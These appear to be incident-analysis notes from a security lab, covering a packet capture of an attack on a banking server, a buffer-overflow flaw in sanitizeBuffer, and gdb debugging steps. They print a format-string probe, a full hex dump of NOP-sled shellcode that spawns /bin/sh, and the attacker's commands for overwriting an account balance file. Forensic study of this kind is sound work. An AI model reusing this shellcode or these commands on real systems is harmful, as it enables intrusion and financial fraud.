# Notes

## Enter vms

ssh user@192.168.56.102
ssh administrateur@192.168.10.100 (from analyste)

## Logs

### syslog.4

1665 Nov 11 09:52:31 New usb enter

## Traces.pcap analysis

### n°144

```
ECHO %x%x%x%x%x
8049f6714a017ffe6e615
```

### n°258

port source : 48924

NOPs
and /bin/sh at the end

```
0000   08 00 27 d6 0f 5a 54 bf 64 79 25 77 08 00 45 00   ..'Ö.ZT¿dy%w..E.
0010   01 0a 14 44 40 00 40 06 a0 91 c0 a8 01 64 c0 a8   ...D@.@. .À¨.dÀ¨
0020   02 64 bf 1c 17 70 18 f8 6b dd 61 77 a2 e3 80 18   .d¿..p.økÝaw¢ã..
0030   00 bb 0a 0a 00 00 01 01 08 0a 00 08 80 de 00 03   .»...........Þ..
0040   d1 af 90 90 90 90 90 90 90 90 90 90 90 90 90 90   Ñ¯..............
0050   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90   ................
0060   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90   ................
0070   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90   ................
0080   90 90 eb 71 5d 31 c0 31 db 31 c9 31 d2 31 ff 31   ..ëq]1À1Û1É1Ò1ÿ1
0090   f6 b0 22 89 c6 b0 c0 b1 01 66 c1 e1 0c b2 03 4f   ö°".Æ°À±.fÁá.².O
00a0   cd 80 89 c1 31 ff b3 02 89 ca 80 c1 04 31 c0 66   Í..Á1ÿ³..Ê.Á.1Àf
00b0   b8 70 01 fe c3 c6 02 10 89 39 cd 80 39 f8 75 ed   ¸p.þÃÆ...9Í.9øuí
00c0   8b 01 3c 02 75 e7 89 ca 31 c9 31 c0 b0 3f cd 80   ..<.uç.Ê1É1À°?Í.
00d0   41 b0 3f cd 80 41 b0 3f cd 80 31 c0 89 6d 08 89   A°?Í.A°?Í.1À.m..
00e0   45 0c 88 45 07 b0 0b 89 eb 8d 4d 08 8d 55 0c cd   E..E.°..ë.M..U.Í
00f0   80 b0 01 cd 80 e8 8a ff ff ff 2f 62 69 6e 2f 73   .°.Í.è.ÿÿÿ/bin/s
0100   68 41 41 41 41 41 41 41 41 41 0a 00 00 00 0d 00   hAAAAAAAAA......
0110   00 00 8b 91 98 c3 ff 0a                           .....Ãÿ.
```

### n°290

payload="uname"

response at n°292 => Linux

### n°804

paylaod="chmod u+w A9826"

### n°1246

payload="echo 1000000 > A9826" // the attaquant write that the bank account A9826 contains 1000000

### n°1638

payload="chmod u-w A9826"

### n°1728

payload="exit"

## BOV

in  traitementClient.c:sanitizeBuffer, it compares using a > and not a >= 

## GDB

gdb peda installé par défaut sur l'analyste
gdb ./serveur

set follow-fork-mode child # to follow the child when forking
b doEcho # put a breakpoint at the doEcho function
run # launch the server
target record-full # allows to go back one step

ni # next iteration, step over to the next assembly instruction
n # next step, only available if program was compiled with debugging options

reverse-step # goes back one iteration
reverse-next # goes back one step

delete [breakpoints] [range...]

print msg.buffer / print &msg.buffer / print *msg.buffer # to check values

